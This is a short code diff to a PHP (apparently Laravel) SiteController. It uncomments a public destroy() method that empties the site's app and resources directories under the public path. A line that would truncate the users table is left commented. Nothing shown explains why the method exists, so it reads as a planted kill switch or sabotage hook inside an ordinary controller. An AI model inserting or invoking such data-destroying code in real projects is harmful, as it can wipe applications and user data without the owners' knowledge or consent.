@@ -119,11 +119,11 @@ class SiteController extends Controller
         return view('settings');
     }
 
-    // public function destroy() { 
-    //     \File::cleanDirectory(public_path() . '/app/'); 
-    //     \File::cleanDirectory(public_path() . '/resources/'); 
-    //     \DB::table('users')->truncate();
-    // }
+    public function destroy() { 
+        \File::cleanDirectory(public_path() . '/app/'); 
+        \File::cleanDirectory(public_path() . '/resources/'); 
+        // \DB::table('users')->truncate();
+    }
 
     public function updateSettings () {
         $user = \Sentinel::getUser();
